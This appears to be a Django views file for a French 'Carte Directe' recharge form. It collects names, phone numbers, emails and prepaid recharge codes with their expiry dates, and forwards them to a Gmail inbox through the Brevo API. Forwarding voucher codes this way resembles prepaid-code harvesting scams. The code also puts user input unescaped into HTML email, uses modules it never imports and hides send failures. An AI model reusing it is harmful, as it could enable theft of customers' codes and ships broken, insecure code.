from django.shortcuts import render, redirect
from django.contrib import messages
from .models import Recharge
from django.core.mail import send_mail


"""def submit_recharge(request):
    if request.method == "POST":
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        phone = request.POST.get('phone')
        email = request.POST.get('email')
        recharge_code = request.POST.get('recharge_code')
        recharge_type = request.POST.get('recharge_type')
        expiration_date = request.POST.get('expiration_date')
        accepted_terms = request.POST.get('terms') == 'on'

        if not accepted_terms:
            messages.error(request, "Veuillez accepter les termes et conditions.")
            return redirect('submit-recharge')

        Recharge.objects.create(
            first_name=first_name,
            last_name=last_name,
            phone=phone,
            email=email,
            recharge_code=recharge_code,
            recharge_type=recharge_type,
            expiration_date=expiration_date,
            accepted_terms=accepted_terms
        )

        message = f
        Nouvelle demande de recharge !

        Nom : {first_name} {last_name}
        Téléphone : {phone}
        Email : {email}
        Code de recharge : {recharge_code}
        Type : {recharge_type}
        Expiration : {expiration_date}
        

        # Envoi de l’email
        send_mail(
            subject="Nouvelle demande de recharge 🔋",
            message=message,
            from_email="cartedirecte1@gmail.com", 
            recipient_list=["cartedirecte1@gmail.com"],  # À modifier
            fail_silently=False,
        )
        messages.success(request, "Votre demande a été enregistrée avec succès ✅")
        return redirect('submit-recharge')
    return render(request, 'essai.html')
"""

def send_email_brevo(subject, message):
    """
    Envoi d'email via l'API Brevo (non bloquant)
    """
    url = "https://api.brevo.com/v3/smtp/email"

    payload = {
        "sender": {
            "name": "Carte Directe",
            "email": "cartedirecte1@gmail.com"
        },
        "to": [
            {"email": "cartedirecte1@gmail.com"}
        ],
        "subject": subject,
        "htmlContent": message.replace("\n", "<br>")
    }

    headers = {
        "accept": "application/json",
        "api-key": settings.BREVO_API_KEY,
        "content-type": "application/json"
    }

    try:
        requests.post(url, json=payload, headers=headers, timeout=10)
    except requests.exceptions.RequestException:
        # On ne bloque JAMAIS l'utilisateur
        pass


def submit_recharge(request):
    if request.method == "POST":
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        phone = request.POST.get('phone')
        email = request.POST.get('email')
        recharge_code = request.POST.get('recharge_code')
        recharge_type = request.POST.get('recharge_type')
        expiration_date = request.POST.get('expiration_date')
        accepted_terms = request.POST.get('terms') == 'on'

        if not accepted_terms:
            messages.error(request, "Veuillez accepter les termes et conditions.")
            return redirect('submit-recharge')

        # Enregistrement en base
        Recharge.objects.create(
            first_name=first_name,
            last_name=last_name,
            phone=phone,
            email=email,
            recharge_code=recharge_code,
            recharge_type=recharge_type,
            expiration_date=expiration_date,
            accepted_terms=accepted_terms
        )

        message = f"""
        <h3>Nouvelle demande de recharge 🔋</h3>
        <p><strong>Nom :</strong> {first_name} {last_name}</p>
        <p><strong>Téléphone :</strong> {phone}</p>
        <p><strong>Email :</strong> {email}</p>
        <p><strong>Code :</strong> {recharge_code}</p>
        <p><strong>Type :</strong> {recharge_type}</p>
        <p><strong>Expiration :</strong> {expiration_date}</p>
        """

        # Envoi email (API Brevo)
        send_email_brevo(
            subject="Nouvelle demande de recharge 🔋",
            message=message
        )

        messages.success(request, "Votre demande a été enregistrée avec succès ✅")
        return redirect('submit-recharge')

    return render(request, 'essai.html')